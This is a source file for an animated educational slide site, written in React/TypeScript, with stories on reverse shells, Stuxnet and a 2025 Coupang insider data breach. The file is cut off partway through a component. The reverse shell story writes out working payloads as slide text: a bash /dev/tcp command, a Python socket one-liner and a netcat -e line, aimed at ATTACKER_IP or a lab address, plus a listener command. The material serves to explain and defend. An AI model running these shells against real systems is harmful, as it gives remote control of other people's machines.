"use client";

import { useState, useEffect, useCallback, useRef } from "react";
import dynamic from "next/dynamic";
import type L from "leaflet";
import "leaflet/dist/leaflet.css";

// Story data type definitions
interface StatItem {
  value: string;
  label: string;
}

interface NetworkNode {
  id: string;
  label: string;
  x: number;
  y: number;
  infected?: boolean;
}

interface NetworkConnection {
  from: string;
  to: string;
  attack?: boolean;
}

interface TimelineEvent {
  year: string;
  text: string;
}

interface CodeLine {
  text: string;
  type: string;
}

interface TerminalLine {
  text: string;
  type: 'command' | 'output' | 'comment' | 'prompt' | 'error' | 'success';
  delay?: number;
}

interface TerminalConfig {
  title: string;
  lines: TerminalLine[];
  side?: 'attacker' | 'victim';
}

interface Slide {
  type: string;
  title?: string;
  subtitle?: string;
  content?: string;
  subtext?: string;
  number?: string;
  label?: string;
  items?: StatItem[];
  root?: string;
  phases?: string[][];
  nodes?: NetworkNode[];
  connections?: NetworkConnection[];
  events?: TimelineEvent[];
  lines?: CodeLine[];
  stage?: number;
  mapType?: string;
  terminals?: TerminalConfig[];
}

interface Story {
  id: string;
  title: string;
  subtitle: string;
  slides: Slide[];
}

// All Stories
const stories: Record<string, Story> = {
  reverseShell: {
    id: "reverseShell",
    title: "Reverse Shell",
    subtitle: "How Hackers Get Remote Access",
    slides: [
      {
        type: "title",
        title: "REVERSE SHELL",
        subtitle: "How Hackers Bypass Firewalls"
      },
      {
        type: "text",
        content: "What if the <span class='highlight-red'>victim</span> connects to <span class='highlight'>you</span>?",
        subtext: "Instead of you connecting to them."
      },
      {
        type: "text",
        content: "That's a <span class='highlight'>Reverse Shell</span>",
        subtext: "The target initiates the connection outward."
      },
      {
        type: "bigNumber",
        number: "🔥",
        label: "Bypasses inbound firewall rules"
      },
      {
        type: "network",
        title: "Normal Shell vs Reverse Shell",
        nodes: [
          { id: "attacker", label: "Attacker", x: 15, y: 50 },
          { id: "firewall", label: "🧱 Firewall", x: 50, y: 50 },
          { id: "victim", label: "Victim", x: 85, y: 50, infected: true }
        ],
        connections: [
          { from: "attacker", to: "firewall", attack: true },
          { from: "firewall", to: "victim" }
        ]
      },
      {
        type: "text",
        content: "Firewalls <span class='highlight-red'>block</span> incoming connections",
        subtext: "But they usually allow outgoing traffic..."
      },
      {
        type: "network",
        title: "Reverse Shell: Victim Connects Out",
        nodes: [
          { id: "victim", label: "Victim", x: 15, y: 50, infected: true },
          { id: "firewall", label: "🧱 Firewall", x: 50, y: 50 },
          { id: "attacker", label: "Attacker", x: 85, y: 50 }
        ],
        connections: [
          { from: "victim", to: "firewall", attack: true },
          { from: "firewall", to: "attacker", attack: true }
        ]
      },
      {
        type: "text",
        content: "Outbound traffic = <span class='highlight'>Trusted</span>",
        subtext: "The connection looks legitimate to the firewall."
      },
      { type: "reverseShellFlow", stage: 0 },
      { type: "reverseShellFlow", stage: 1 },
      { type: "reverseShellFlow", stage: 2 },
      { type: "reverseShellFlow", stage: 3 },
      {
        type: "terminal",
        title: "Step 1: Attacker Listens",
        terminals: [
          {
            title: "ATTACKER (Kali Linux)",
            side: "attacker",
            lines: [
              { text: "root@kali:~#", type: "prompt" },
              { text: " nc -lvnp 4444", type: "command" },
              { text: "listening on [any] 4444 ...", type: "output", delay: 800 }
            ]
          }
        ]
      },
      {
        type: "terminal",
        title: "Step 2: Victim Executes Payload",
        terminals: [
          {
            title: "VICTIM (Target Server)",
            side: "victim",
            lines: [
              { text: "user@server:~$", type: "prompt" },
              { text: " bash -i >& /dev/tcp/10.10.14.5/4444 0>&1", type: "command" }
            ]
          }
        ]
      },
      {
        type: "terminal",
        title: "Step 3: Connection Established!",
        terminals: [
          {
            title: "ATTACKER (Kali Linux)",
            side: "attacker",
            lines: [
              { text: "listening on [any] 4444 ...", type: "output" },
              { text: "connect to [10.10.14.5] from (UNKNOWN) [10.10.10.100] 52412", type: "success", delay: 500 },
              { text: "user@server:~$", type: "prompt", delay: 300 },
              { text: " whoami", type: "command", delay: 200 },
              { text: "user", type: "output", delay: 400 },
              { text: "user@server:~$", type: "prompt", delay: 200 },
              { text: " id", type: "command", delay: 200 },
              { text: "uid=1000(user) gid=1000(user) groups=1000(user)", type: "output", delay: 400 },
              { text: "user@server:~$", type: "prompt", delay: 200 },
              { text: " cat /etc/passwd | head -3", type: "command", delay: 200 },
              { text: "root:x:0:0:root:/root:/bin/bash", type: "output", delay: 200 },
              { text: "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin", type: "output", delay: 100 },
              { text: "bin:x:2:2:bin:/bin:/usr/sbin/nologin", type: "output", delay: 100 }
            ]
          }
        ]
      },
      {
        type: "code",
        title: "Common Reverse Shell Payloads",
        lines: [
          { text: "# Bash", type: "comment" },
          { text: "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1", type: "normal" },
          { text: "", type: "normal" },
          { text: "# Python", type: "comment" },
          { text: "python -c 'import socket,os,pty;s=socket.socket();", type: "normal" },
          { text: "s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);", type: "normal" },
          { text: "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'", type: "normal" },
          { text: "", type: "normal" },
          { text: "# Netcat", type: "comment" },
          { text: "nc -e /bin/bash ATTACKER_IP PORT", type: "normal" }
        ]
      },
      {
        type: "stats",
        items: [
          { value: "4444", label: "Classic Port" },
          { value: "443", label: "Stealthy (HTTPS)" },
          { value: "53", label: "Sneaky (DNS)" },
          { value: "80", label: "Common (HTTP)" }
        ]
      },
      {
        type: "text",
        content: "<span class='highlight-purple'>Defense:</span> Monitor outbound connections",
        subtext: "Egress filtering and anomaly detection."
      },
      {
        type: "attackTree",
        root: "Establish Reverse Shell",
        phases: [
          ["Reconnaissance", "Delivery", "Execution"],
          ["Find Open Port", "Phishing/Exploit", "Payload Runs"]
        ]
      },
      {
        type: "text",
        content: "Reverse shells are <span class='highlight-red'>everywhere</span>",
        subtext: "Used in CTFs, penetration testing, and real attacks."
      },
      {
        type: "title",
        title: "KEY TAKEAWAYS",
        subtitle: "Victim connects out • Bypasses firewalls • Monitor egress traffic"
      }
    ]
  },
  
  stuxnet: {
    id: "stuxnet",
    title: "Stuxnet",
    subtitle: "The World's First Cyber Weapon",
    slides: [
      {
        type: "text",
        content: "Someone just <span class='highlight-red'>blew up</span> a nuclear facility",
        subtext: "Without firing a single shot."
      },
      {
        type: "bigNumber",
        number: "1,000",
        label: "centrifuges — destroyed"
      },
      {
        type: "text",
        content: "Iran's <span class='highlight-red'>nuclear program</span>",
        subtext: "was under attack. They had no idea."
      },
      {
        type: "text",
        content: "The weapon? <span class='highlight'>A USB stick.</span>",
        subtext: ""
      },
      {
        type: "network",
        title: "It spread like a virus",
        nodes: [
          { id: "usb", label: "USB", x: 8, y: 50 },
          { id: "pc", label: "PC", x: 30, y: 30, infected: true },
          { id: "scada", label: "SCADA", x: 52, y: 50, infected: true },
          { id: "plc", label: "PLC", x: 74, y: 30, infected: true },
          { id: "centrifuge", label: "Target", x: 92, y: 50, infected: true }
        ],
        connections: [
          { from: "usb", to: "pc", attack: true },
          { from: "pc", to: "scada", attack: true },
          { from: "scada", to: "plc", attack: true },
          { from: "plc", to: "centrifuge", attack: true }
        ]
      },
      { type: "attackFlow", stage: 0 },
      { type: "attackFlow", stage: 1 },
      { type: "attackFlow", stage: 2 },
      { type: "attackFlow", stage: 3 },
      { type: "attackFlow", stage: 4 },
      {
        type: "text",
        content: "It made centrifuges <span class='highlight-red'>tear themselves apart</span>",
        subtext: "While screens showed: \"All systems normal.\""
      },
      {
        type: "stats",
        items: [
          { value: "5", label: "Zero-Days Used" },
          { value: "14", label: "Months Hidden" }
        ]
      },
      {
        type: "text",
        content: "This wasn't hackers.",
        subtext: ""
      },
      {
        type: "text",
        content: "This was <span class='highlight'>governments.</span>",
        subtext: "USA + Israel. Codename: Olympic Games."
      },
      {
        type: "text",
        content: "<span class='highlight-purple'>Code</span> became a <span class='highlight-red'>weapon of war.</span>",
        subtext: "And nothing was ever the same."
      },
      {
        type: "title",
        title: "STUXNET",
        subtitle: "The world's first cyber weapon • 2010"
      }
    ]
  },
  
  coupang: {
    id: "coupang",
    title: "Coupang Breach",
    subtitle: "South Korea's Biggest Data Leak",
    slides: [
      {
        type: "title",
        title: "THE COUPANG BREACH",
        subtitle: "When the Insider Became the Threat"
      },
      {
        type: "text",
        content: "In late 2025, South Korea's largest e-commerce platform was breached...",
        subtext: "By one of their own."
      },
      {
        type: "map",
        mapType: "korea-location",
        title: "Seoul, South Korea",
        subtitle: "Coupang Headquarters — Songpa District"
      },
      {
        type: "bigNumber",
        number: "33.7M",
        label: "User accounts compromised"
      },
      {
        type: "text",
        content: "That's <span class='highlight-red'>65%</span> of South Korea's population",
        subtext: "The largest data breach in the country's history"
      },
      {
        type: "stats",
        items: [
          { value: "147", label: "Days Undetected" },
          { value: "65%", label: "Population Affected" },
          { value: "$1.18B", label: "Voucher Payout" },
          { value: "1", label: "Insider" }
        ]
      },
      {
        type: "text",
        content: "The perpetrator: <span class='highlight-red'>A former employee</span>",
        subtext: "Someone who knew the systems inside and out"
      },
      {
        type: "attackTree",
        root: "Exfiltrate Customer Database",
        phases: [
          ["Privileged Access", "Data Collection", "Exfiltration"],
          ["Employee Credentials", "Bulk Queries", "External Transfer"]
        ]
      },
      {
        type: "timeline",
        title: "The 147-Day Breach",
        events: [
          { year: "July 2025", text: "Unauthorized access begins" },
          { year: "Aug-Oct 2025", text: "Data silently exfiltrated over months" },
          { year: "Nov 2025", text: "Breach finally detected by security team" },
          { year: "Nov 30", text: "Public disclosure shocks the nation" },
          { year: "Dec 2025", text: "Suspect flees South Korea" }
        ]
      },
      {
        type: "text",
        content: "When investigators closed in, the suspect <span class='highlight-red'>vanished</span>",
        subtext: "Disappearing across the Yellow Sea..."
      },
      {
        type: "map",
        mapType: "korea-china-flight",
        title: "The Escape",
        subtitle: "Seoul → Somewhere in China"
      },
      {
        type: "text",
        content: "Before fleeing, the suspect <span class='highlight-purple'>threw their laptop into a river</span>",
        subtext: "Destroying evidence... or so they thought."
      },
      {
        type: "text",
        content: "Investigators <span class='highlight'>recovered the laptop</span> from the riverbed",
        subtext: "Digital forensics never sleeps"
      },
      {
        type: "stats",
        items: [
          { value: "CEO", label: "Resigned" },
          { value: "₩1.7T", label: "Compensation Fund" },
          { value: "0.03%", label: "Security Budget" },
          { value: "∞", label: "Trust Lost" }
        ]
      },
      {
        type: "text",
        content: "Coupang spent just <span class='highlight-red'>0.03%</span> of revenue on security",
        subtext: "Far below industry standards"
      },
      {
        type: "code",
        title: "What They Took",
        lines: [
          { text: "// Customer data exfiltrated:", type: "comment" },
          { text: "- Full names", type: "normal" },
          { text: "- Phone numbers", type: "normal" },
          { text: "- Email addresses", type: "normal" },
          { text: "- Home addresses", type: "normal" },
          { text: "- Order history", type: "normal" },
          { text: "- Payment information (partial)", type: "normal" },
          { text: "", type: "normal" },
          { text: "// 33.7 million records", type: "comment" }
        ]
      },
      {
        type: "text",
        content: "The breach sparked <span class='highlight-purple'>nationwide debate</span> about insider threats",
        subtext: "And the true cost of underinvesting in security"
      },
      {
        type: "title",
        title: "LESSONS LEARNED",
        subtitle: "Your biggest threat might already be inside"
      }
    ]
  }
};

// Dynamic import for Leaflet components (no SSR)
const MapContainer = dynamic(
  () => import("react-leaflet").then((mod) => mod.MapContainer),
  { ssr: false }
);
const TileLayer = dynamic(
  () => import("react-leaflet").then((mod) => mod.TileLayer),
  { ssr: false }
);
const Marker = dynamic(
  () => import("react-leaflet").then((mod) => mod.Marker),
  { ssr: false }
);
const Popup = dynamic(
  () => import("react-leaflet").then((mod) => mod.Popup),
  { ssr: false }
);
const Circle = dynamic(
  () => import("react-leaflet").then((mod) => mod.Circle),
  { ssr: false }
);
const Polyline = dynamic(
  () => import("react-leaflet").then((mod) => mod.Polyline),
  { ssr: false }
);

// Custom marker icon (fixes default Leaflet icon issue in Next.js)
function useLeafletIcon() {
  const [icon, setIcon] = useState<L.Icon | null>(null);
  
  useEffect(() => {
    import("leaflet").then((L) => {
      const customIcon = new L.Icon({
        iconUrl: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ff3366'%3E%3Ccircle cx='12' cy='12' r='10' stroke='%23fff' stroke-width='2'/%3E%3C/svg%3E",
        iconSize: [24, 24],
        iconAnchor: [12, 12],
        popupAnchor: [0, -12],
      });
      setIcon(customIcon);
    });
  }, []);
  
  return icon;
}

// Korea Location Map using Leaflet
function KoreaLocationMap() {
  const [mounted, setMounted] = useState(false);
  const icon = useLeafletIcon();
  
  useEffect(() => {
    setMounted(true);
  }, []);
  
  if (!mounted) {
    return <div className="leaflet-loading">Loading map...</div>;
  }
  
  // Coupang HQ coordinates (Songpa District, Seoul)
  const coupangHQ: [number, number] = [37.5045, 127.0245];
  
  return (
    <div className="leaflet-container-wrapper">
      <MapContainer
        center={coupangHQ}
        zoom={12}
        className="leaflet-map"
        zoomControl={false}
        attributionControl={false}
      >
        <TileLayer
          url="https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png"
          attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
        />
        {icon && (
          <Marker position={coupangHQ} icon={icon}>
            <Popup className="custom-popup">
              <div className="popup-content">
                <strong>🏢 Coupang HQ</strong>
                <br />
                <span>Songpa District, Seoul</span>
                <br />
                <small>Ground zero of the breach</small>
              </div>
            </Popup>
          </Marker>
        )}
        <Circle
          center={coupangHQ}
          radius={2000}
          pathOptions={{
            color: "#ff3366",
            fillColor: "#ff3366",
            fillOpacity: 0.15,
            weight: 2,
          }}
        />
      </MapContainer>
      <div className="map-label">
        <span className="map-label-icon">📍</span>
        <span>Coupang HQ • Seoul, South Korea</span>
      </div>
    </div>
  );
}

// Korea to China Flight Map using Leaflet
function KoreaChinaFlightMap() {
  const [mounted, setMounted] = useState(false);
  const [iconOrigin, setIconOrigin] = useState<L.Icon | null>(null);
  const [iconDest, setIconDest] = useState<L.Icon | null>(null);
  
  useEffect(() => {
    setMounted(true);
    import("leaflet").then((L) => {
      setIconOrigin(new L.Icon({
        iconUrl: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2300f0ff'%3E%3Ccircle cx='12' cy='12' r='10' stroke='%23fff' stroke-width='2'/%3E%3C/svg%3E",
        iconSize: [20, 20],
        iconAnchor: [10, 10],
        popupAnchor: [0, -10],
      }));
      setIconDest(new L.Icon({
        iconUrl: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ff3366'%3E%3Ccircle cx='12' cy='12' r='10' stroke='%23fff' stroke-width='2'/%3E%3C/svg%3E",
        iconSize: [20, 20],
        iconAnchor: [10, 10],
        popupAnchor: [0, -10],
      }));
    });
  }, []);
  
  if (!mounted) {
    return <div className="leaflet-loading">Loading map...</div>;
  }
  
  // Coordinates
  const seoul: [number, number] = [37.5665, 126.9780];
  const qingdao: [number, number] = [36.0671, 120.3826]; // Possible destination
  const flightPath: [number, number][] = [
    seoul,
    [37.2, 124.5], // Over Yellow Sea
    [36.5, 122.5], // Curve point
    qingdao
  ];
  
  return (
    <div className="leaflet-container-wrapper">
      <MapContainer
        center={[36.5, 123]}
        zoom={5}
        className="leaflet-map"
        zoomControl={false}
        attributionControl={false}
      >
        <TileLayer
          url="https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png"
          attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
        />
        {iconOrigin && (
          <Marker position={seoul} icon={iconOrigin}>
            <Popup className="custom-popup">
              <div className="popup-content">
                <strong>✈️ Seoul</strong>
                <br />
                <span>Point of departure</span>
              </div>
            </Popup>
          </Marker>
        )}
        {iconDest && (
          <Marker position={qingdao} icon={iconDest}>
            <Popup className="custom-popup">
              <div className="popup-content">
                <strong>❓ Destination Unknown</strong>
                <br />
                <span>Somewhere in China</span>
              </div>
            </Popup>
          </Marker>
        )}
        <Polyline
          positions={flightPath}
          pathOptions={{
            color: "#ff3366",
            weight: 3,
            opacity: 0.8,
            dashArray: "10, 5",
          }}
        />
      </MapContainer>
      <div className="map-label flight">
        <span className="map-label-icon">✈️</span>
        <span>Seoul → China • ~550 km</span>
      </div>
    </div>
  );
}

// Map Slide Component
function MapSlide({ slide }: { slide: Slide }) {
  return (
    <div className="map-slide">
      <h2 className="slide-subtitle mb-2">{slide.title}</h2>
      <p className="slide-subtitle" style={{ fontSize: '14px', marginBottom: '20px' }}>{slide.subtitle}</p>
      <div className="map-container">
        {slide.mapType === 'korea-location' && <KoreaLocationMap />}
        {slide.mapType === 'korea-china-flight' && <KoreaChinaFlightMap />}
      </div>
    </div>
  );
}

// Mobile Attack Stage - Card-based vertical flow
function MobileAttackStage({ stage }: { stage: number }) {
  const stages = [
    { icon: '💾', from: 'USB Drive', to: '💻', toLabel: 'Engineer PC', title: 'USB INSERTION', desc: 'Infected USB planted by contractor' },
    { icon: '💻', from: 'Engineer PC', to: '🌐', toLabel: 'Air-Gapped Network', title: 'INITIAL INFECTION', desc: 'Worm exploits Windows zero-days' },
    { icon: '🌐', from: 'Network', to: '🖥️', toLabel: 'SCADA System', title: 'NETWORK SPREAD', desc: 'Propagates through shared drives' },
    { icon: '🖥️', from: 'SCADA', to: '⚙️', toLabel: 'Siemens PLC', title: 'SCADA COMPROMISE', desc: 'Targets WinCC/Step 7 software' },
    { icon: '⚙️', from: 'PLC', to: '☢️', toLabel: 'Centrifuges', title: 'PAYLOAD DELIVERY', desc: 'Injects malicious code into PLCs' },
  ];
  
  const current = stages[stage];
  
  return (
    <div className="mobile-attack">
      <div className="mobile-attack-header">
        <span className="mobile-stage-num">STAGE {stage + 1}/5</span>
        <h3 className="mobile-stage-title">{current.title}</h3>
      </div>
      
      <div className="mobile-attack-visual">
        <div className="mobile-node source">
          <span className="mobile-node-icon">{current.icon}</span>
          <span className="mobile-node-label">{current.from}</span>
        </div>
        
        <div className="mobile-arrow">
          <div className="mobile-arrow-line" />
          <div className="mobile-arrow-pulse" />
          <span className="mobile-arrow-icon">▼</span>
        </div>
        
        <div className="mobile-node target">
          <span className="mobile-node-icon">{current.to}</span>
          <span className="mobile-node-label">{current.toLabel}</span>
        </div>
      </div>
      
      <p className="mobile-stage-desc">{current.desc}</p>
      
      <div className="mobile-progress">
        {stages.map((_, i) => (
          <div key={i} className={`mobile-progress-dot ${i <= stage ? 'active' : ''} ${i === stage ? 'current' : ''}`} />
        ))}
      </div>
    </div>
  );
}

// Desktop Attack Stage - Network diagram with packet animation
function DesktopAttackStage({ stage }: { stage: number }) {
  const [packetProgress, setPacketProgress] = useState(0);
  const prevStageRef = useRef(stage);
  
  useEffect(() => {
    if (prevStageRef.current !== stage) {
      setPacketProgress(0);
      prevStageRef.current = stage;
    }
    const interval = setInterval(() => {
      setPacketProgress(p => Math.min(1, p + 0.015));
    }, 30);
    return () => clearInterval(interval);
  }, [stage]);
  
  const nodes = [
    { id: 'usb', label: 'USB Drive', x: 6, y: 70, icon: '💾' },
    { id: 'laptop', label: 'Engineer PC', x: 23, y: 30, icon: '💻' },
    { id: 'network', label: 'Air-Gapped', x: 41, y: 70, icon: '🌐' },
    { id: 'scada', label: 'SCADA', x: 59, y: 30, icon: '🖥️' },
    { id: 'plc', label: 'PLC', x: 77, y: 70, icon: '⚙️' },
    { id: 'centrifuge', label: 'Centrifuges', x: 94, y: 30, icon: '☢️' },
  ];
  
  const stageInfo = [
    { title: "USB INSERTION", desc: "Infected USB planted by contractor", from: 0, to: 1 },
    { title: "INITIAL INFECTION", desc: "Worm exploits Windows zero-days", from: 1, to: 2 },
    { title: "NETWORK SPREAD", desc: "Propagates through shared drives", from: 2, to: 3 },
    { title: "SCADA COMPROMISE", desc: "Targets WinCC/Step 7 software", from: 3, to: 4 },
    { title: "PAYLOAD DELIVERY", desc: "Injects malicious code into PLCs", from: 4, to: 5 },
  ];
  
  const currentStage = stageInfo[stage] || stageInfo[0];
  const fromNode = nodes[currentStage.from];
  const toNode = nodes[currentStage.to];
  
  const packetX = fromNode.x + (toNode.x - fromNode.x) * packetProgress;
  const packetY = fromNode.y + (toNode.y - fromNode.y) * packetProgress;
  
  return (
    <div className="attack-flow">
      <div className="attack-header">
        <span className="attack-stage-num">STAGE {stage + 1}/5</span>
        <h3 className="attack-stage-title">{currentStage.title}</h3>
        <p className="attack-stage-desc">{currentStage.desc}</p>
      </div>
      
      <div className="attack-diagram">
        <svg className="attack-paths" viewBox="0 0 100 100" preserveAspectRatio="none">
          {nodes.slice(0, -1).map((node, i) => {
            const next = nodes[i + 1];
            const isActive = i <= stage;
            const isCurrent = i === stage;
            return (
              <line
                key={i}
                x1={node.x}
                y1={node.y}
                x2={next.x}
                y2={next.y}
                className={`attack-path-line ${isActive ? 'active' : ''} ${isCurrent ? 'current' : ''}`}
              />
            );
          })}
        </svg>
        
        <div
          className="attack-packet"
          style={{
            left: `${packetX}%`,
            top: `${packetY}%`,
          }}
        />
        
        {nodes.map((node, i) => {
          const isInfected = i <= stage;
          const isTarget = i === stage + 1;
          const isSource = i === stage;
          return (
            <div
              key={node.id}
              className={`attack-node ${isInfected ? 'infected' : ''} ${isTarget ? 'target' : ''} ${isSource ? 'source' : ''}`}
              style={{
                left: `${node.x}%`,
                top: `${node.y}%`,
              }}
            >
              <span className="attack-node-icon">{node.icon}</span>
              <span className="attack-node-label">{node.label}</span>
            </div>
          );
        })}
      </div>
    </div>
  );
}

// Terminal Component with typing animation
function Terminal({ config, isActive }: { config: TerminalConfig; isActive: boolean }) {
  const [visibleLines, setVisibleLines] = useState<number>(0);
  const [typingIndex, setTypingIndex] = useState<number>(0);
  const [currentText, setCurrentText] = useState<string>("");
  
  useEffect(() => {
    if (!isActive) {
      setVisibleLines(0);
      setTypingIndex(0);
      setCurrentText("");
      return;
    }
    
    const lines = config.lines;
    if (visibleLines >= lines.length) return;
    
    const currentLine = lines[visibleLines];
    const fullText = currentLine.text;
    const delay = currentLine.delay || 0;
    
    // If it's a command type, type it character by character
    if (currentLine.type === 'command' && typingIndex < fullText.length) {
      const timer = setTimeout(() => {
        setCurrentText(fullText.slice(0, typingIndex + 1));
        setTypingIndex(prev => prev + 1);
      }, 30 + Math.random() * 40);
      return () => clearTimeout(timer);
    }
    
    // When typing is complete or it's not a command, show full line and move to next
    if (currentLine.type !== 'command' || typingIndex >= fullText.length) {
      const timer = setTimeout(() => {
        setVisibleLines(prev => prev + 1);
        setTypingIndex(0);
        setCurrentText("");
      }, currentLine.type === 'command' ? 200 : delay + 100);
      return () => clearTimeout(timer);
    }
  }, [isActive, visibleLines, typingIndex, config.lines]);
  
  return (
    <div className={`terminal ${config.side || 'default'}`}>
      <div className="terminal-header">
        <div className="terminal-buttons">
          <span className="terminal-btn red" />
          <span className="terminal-btn yellow" />
          <span className="terminal-btn green" />
        </div>
        <span className="terminal-title">{config.title}</span>
      </div>
      <div className="terminal-body">
        {config.lines.slice(0, visibleLines).map((line, i) => (
          <div key={i} className={`terminal-line ${line.type}`}>
            {line.text}
          </div>
        ))}
        {visibleLines < config.lines.length && config.lines[visibleLines].type === 'command' && (
          <div className={`terminal-line ${config.lines[visibleLines].type}`}>
            {config.lines[visibleLines - 1]?.type === 'prompt' ? '' : ''}
            {currentText}
            <span className="cursor">▊</span>
          </div>
        )}
        {visibleLines < config.lines.length && config.lines[visibleLines].type === 'prompt' && (
          <div className="terminal-line prompt">
            {config.lines[visibleLines].text}
            <span className="cursor">▊</span>
          </div>
        )}
      </div>
    </div>
  );
}

// Terminal Slide Component
function TerminalSlide({ slide }: { slide: Slide }) {
  return (
    <div className="terminal-slide">
      <h2 className="slide-subtitle mb-4">{slide.title}</h2>
      <div className={`terminals-container ${slide.terminals?.length === 2 ? 'dual' : 'single'}`}>
        {slide.terminals?.map((terminal, i) => (
          <Terminal key={i} config={terminal} isActive={true} />
        ))}
      </div>
    </div>
  );
}

// Reverse Shell Flow - shows the connection stages
function ReverseShellFlow({ stage, isMobile = false }: { stage: number; isMobile?: boolean }) {
  const [packetProgress, setPacketProgress] = useState(0);
  const prevStageRef = useRef(stage);
  
  useEffect(() => {
    if (prevStageRef.current !== stage) {
      setPacketProgress(0);
      prevStageRef.current = stage;
    }
    const interval = setInterval(() => {
      setPacketProgress(p => Math.min(1, p + 0.02));
    }, 30);
    return () => clearInterval(interval);
  }, [stage]);
  
  const stages = [
    { 
      title: "ATTACKER LISTENS", 
      desc: "Opens a port and waits for incoming connection",
      attacker: { icon: '🎧', label: 'Listening', status: 'waiting' },
      victim: { icon: '💻', label: 'Target', status: 'normal' },
      direction: 'none'
    },
    { 
      title: "PAYLOAD DELIVERED", 
      desc: "Malicious code reaches the victim (phishing, exploit, etc.)",
      attacker: { icon: '🎧', label: 'Listening', status: 'waiting' },
      victim: { icon: '📧', label: 'Payload', status: 'infected' },
      direction: 'to-victim'
    },
    { 
      title: "VICTIM EXECUTES", 
      desc: "Victim unknowingly runs the reverse shell payload",
      attacker: { icon: '🎧', label: 'Listening', status: 'waiting' },
      victim: { icon: '💥', label: 'Executing', status: 'infected' },
      direction: 'none'
    },
    { 
      title: "CONNECTION ESTABLISHED", 
      desc: "Victim connects OUTBOUND to attacker — Shell access granted!",
      attacker: { icon: '🖥️', label: 'Shell!', status: 'success' },
      victim: { icon: '🔓', label: 'Compromised', status: 'infected' },
      direction: 'to-attacker'
    }
  ];
  
  const current = stages[stage];
  
  if (isMobile) {
    return (
      <div className="mobile-attack reverse-shell">
        <div className="mobile-attack-header">
          <span className="mobile-stage-num">STAGE {stage + 1}/4</span>
          <h3 className="mobile-stage-title">{current.title}</h3>
        </div>
        
        <div className="reverse-shell-visual-mobile">
          <div className={`rs-node ${current.attacker.status}`}>
            <span className="rs-icon">{current.attacker.icon}</span>
            <span className="rs-label">ATTACKER</span>
            <span className="rs-status">{current.attacker.label}</span>
          </div>
          
          {current.direction !== 'none' && (
            <div className={`rs-arrow ${current.direction}`}>
              <div className="rs-arrow-line" />
              <div className="rs-packet" style={{ 
                animationDirection: current.direction === 'to-attacker' ? 'reverse' : 'normal' 
              }} />
              <span className="rs-arrow-icon">{current.direction === 'to-attacker' ? '▲' : '▼'}</span>
            </div>
          )}
          {current.direction === 'none' && <div className="rs-spacer" />}
          
          <div className={`rs-node ${current.victim.status}`}>
            <span className="rs-icon">{current.victim.icon}</span>
            <span className="rs-label">VICTIM</span>
            <span className="rs-status">{current.victim.label}</span>
          </div>
        </div>
        
        <p className="mobile-stage-desc">{current.desc}</p>
        
        <div className="mobile-progress">
          {stages.map((_, i) => (
            <div key={i} className={`mobile-progress-dot ${i <= stage ? 'active' : ''} ${i === stage ? 'current' : ''}`} />
          ))}
        </div>
      </div>
    );
  }
  
  // Desktop horizontal layout
  return (
    <div className="attack-flow reverse-shell-flow">
      <div className="attack-header">
        <span className="attack-stage-num">STAGE {stage + 1}/4</span>
        <h3 className="attack-stage-title">{current.title}</h3>
        <p className="attack-stage-desc">{current.desc}</p>
      </div>
      
      <div className="rs-diagram">
        <div className={`rs-endpoint attacker ${current.attacker.status}`}>
          <div className="rs-endpoint-icon">{current.attacker.icon}</div>
          <div className="rs-endpoint-label">ATTACKER</div>
          <div className="rs-endpoint-status">{current.attacker.label}</div>
          <div className="rs-ip">10.10.14.5:4444</div>
        </div>
        
        <div className="rs-connection">
          <div className="rs-firewall">
            <span>🧱</span>
            <span className="rs-firewall-label">Firewall</span>
          </div>
          <svg className="rs-line" viewBox="0 0 100 20">
            <line x1="0" y1="10" x2="100" y2="10" className={`rs-path ${current.direction !== 'none' ? 'active' : ''}`} />
          </svg>
          {current.direction !== 'none' && (
            <div 
              className={`rs-packet-desktop ${current.direction}`}
              style={{ left: current.direction === 'to-attacker' ? `${(1 - packetProgress) * 100}%` : `${packetProgress * 100}%` }}
            />
          )}
        </div>
        
        <div className={`rs-endpoint victim ${current.victim.status}`}>
          <div className="rs-endpoint-icon">{current.victim.icon}</div>
          <div className="rs-endpoint-label">VICTIM</div>
          <div className="rs-endpoint-status">{current.victim.label}</div>
          <div className="rs-ip">10.10.10.100</div>
        </div>
      </div>
      
      <div className="rs-progress">
        {stages.map((s, i) => (
          <div key={i} className={`rs-progress-step ${i <= stage ? 'active' : ''} ${i === stage ? 'current' : ''}`}>
            <div className="rs-progress-dot" />
            <span className="rs-progress-label">{i + 1}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// Compact Attack Stage for small 16:9 viewports
function CompactAttackStage({ stage }: { stage: number }) {
  const stages = [
    { icon: '💾', label: 'USB → PC', title: 'USB INSERTION' },
    { icon: '💻', label: 'PC → Network', title: 'INITIAL INFECTION' },
    { icon: '🌐', label: 'Network → SCADA', title: 'NETWORK SPREAD' },
    { icon: '🖥️', label: 'SCADA → PLC', title: 'SCADA COMPROMISE' },
    { icon: '⚙️', label: 'PLC → Target', title: 'PAYLOAD DELIVERY' },
  ];
  
  const current = stages[stage];
  
  return (
    <div className="compact-attack">
      <div className="compact-stage-badge">STAGE {stage + 1}/5</div>
      <div className="compact-icon">{current.icon}</div>
      <div className="compact-title">{current.title}</div>
      <div className="compact-flow">{current.label}</div>
      <div className="compact-dots">
        {stages.map((_, i) => (
          <span key={i} className={`compact-dot ${i <= stage ? 'active' : ''} ${i === stage ? 'current' : ''}`} />
        ))}
      </div>
    </div>
  );
}

// Wrapper component that chooses between mobile and desktop layouts
function AttackStage({ stage, isMobile = false, isCompact = false }: { stage: number; isMobile?: boolean; isCompact?: boolean }) {
  if (isMobile) {
    return <MobileAttackStage stage={stage} />;
  }
  if (isCompact) {
    return <CompactAttackStage stage={stage} />;
  }
